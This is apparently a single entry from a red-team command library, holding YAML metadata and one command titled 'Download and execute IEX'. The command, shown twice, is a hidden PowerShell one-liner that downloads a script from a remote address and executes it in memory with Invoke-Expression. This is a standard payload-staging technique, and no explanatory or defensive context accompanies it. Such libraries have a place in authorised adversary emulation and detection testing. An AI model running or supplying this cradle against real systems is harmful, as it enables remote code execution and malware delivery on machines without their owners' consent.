---
id: 016be366-49d5-4029-ae34-55c140067a19
name: Download and execute IEX
type: command
executor: bash
data: 'powershell -nop -w hidden -c "iex (New-Object Net.WebClient).DownloadString(''http://192.168.1.1:80/file'')"

  '
output: null
created_at: '2020-07-14T18:21:10.828936+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Download and execute IEX

```bash
powershell -nop -w hidden -c "iex (New-Object Net.WebClient).DownloadString('http://192.168.1.1:80/file')"

```
